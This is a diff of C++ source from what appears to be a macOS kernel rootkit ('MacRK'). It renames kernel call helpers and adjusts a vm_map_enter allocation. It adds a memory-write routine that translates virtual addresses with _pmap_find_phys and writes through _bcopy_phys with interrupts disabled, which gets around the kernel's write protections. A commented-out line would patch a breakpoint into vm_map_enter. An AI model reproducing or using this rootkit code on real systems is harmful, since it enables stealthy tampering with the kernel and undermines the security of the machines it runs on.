@@ -436,14 +436,14 @@ bool Kernel::setInterrupts(bool enable)
 	return Arch::setInterrupts(enable);
 }
 
-uint64_t Kernel::callFunction(char *symbolname, uint64_t *arguments, size_t argCount)
+uint64_t Kernel::call(char *symbolname, uint64_t *arguments, size_t argCount)
 {
 	mach_vm_address_t func = this->getSymbolAddressByName(symbolname);
 
 	return this->call(func, arguments, argCount);
 }
 
-uint64_t Kernel::callFunctionAtAddress(mach_vm_address_t func, uint64_t *arguments, size_t argCount)
+uint64_t Kernel::call(mach_vm_address_t func, uint64_t *arguments, size_t argCount)
 {
 	uint64_t ret = 0;
 
@@ -701,6 +701,7 @@ mach_vm_address_t Kernel::vmAllocate(size_t size)
 }
 
 #define VM_KERN_MEMORY_KEXT            6
+#define VM_KERN_MEMORY_ANY             255
 
 #define VM_INHERIT_SHARE               ((vm_inherit_t) 0)      /* shared with child */
 #define VM_INHERIT_COPY                ((vm_inherit_t) 1)      /* copy into child */
@@ -789,15 +790,21 @@ mach_vm_address_t Kernel::vmAllocate(size_t size, uint32_t flags, vm_prot_t prot
 
 	snprintf(buffer, 128, "0x%llx", vm_map_enter);
 
-	MAC_RK_LOG("MacRK::vm_map_enter() = %s\n", buffer);
+	mach_vm_address_t pmap = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_pmap"));
 
-	snprintf(buffer, 128, "0x%llx", vm_map_enter);
+	mach_vm_address_t pmap_find_phys = this->getSymbolAddressByName("_pmap_find_phys");
+
+	// uint64_t breakpoint = 0xD4388E40D4388E40;
+
+	//this->write(vm_map_enter, (void*) &breakpoint, sizeof(uint64_t));
+
+	MAC_RK_LOG("MacRK::@ vm_map_enter = 0x%x\n", *(uint32_t*) vm_map_enter);
 
 	map = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
 
-	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, 0, VM_KERN_MEMORY_KEXT, 0, 0, FALSE, (uint64_t) prot, (uint64_t) prot, (uint64_t) VM_INHERIT_DEFAULT };
-
-	ret = static_cast<kern_return_t>(this->callFunctionAtAddress(vm_map_enter, vmEnterArgs, 13));
+	uint64_t vmEnterArgs[13] = { map, (uint64_t) &address, size, 0, flags, 0, 512, 0, 0, FALSE, (uint64_t) prot, (uint64_t) prot, (uint64_t) VM_INHERIT_DEFAULT };
+	
+	ret = static_cast<kern_return_t>(this->call(vm_map_enter, vmEnterArgs, 13));
 
 #endif
 
@@ -992,6 +999,39 @@ uint64_t Kernel::read64(mach_vm_address_t address)
 
 bool Kernel::write(mach_vm_address_t address, void *data, size_t size)
 {
+	mach_vm_address_t pmap = *reinterpret_cast<mach_vm_address_t*>(this->getSymbolAddressByName("_kernel_map"));
+
+	uint64_t src_pmapFindPhysArgs[2] = { pmap, (uint64_t) data };
+
+	uint64_t dest_pmapFindPhysArgs[2] = { pmap, address };
+
+	uint64_t src_ppnum;
+	uint64_t src_pa;
+
+	uint64_t dest_ppnum;
+	uint64_t dest_pa;
+
+	src_ppnum = this->call("_pmap_find_phys", src_pmapFindPhysArgs, 2);
+
+	src_pa = ((src_ppnum << 14) | ((mach_vm_address_t) data & 0x3FFF));
+
+	dest_ppnum = this->call("_pmap_find_phys", dest_pmapFindPhysArgs, 2);
+
+	dest_pa = ((dest_ppnum << 14) | ((mach_vm_address_t) address & 0x3FFF));
+
+	if(src_pa && dest_pa)
+	{
+		uint64_t bcopyPhysArgs[3] = { src_pa, dest_pa, size };
+
+		ml_set_interrupts_enabled(false);
+
+		this->call("_bcopy_phys", bcopyPhysArgs, 3);
+
+		ml_set_interrupts_enabled(true);
+
+		return true;
+	}
+
 	return kernel_write(address, data, size);
 }
 
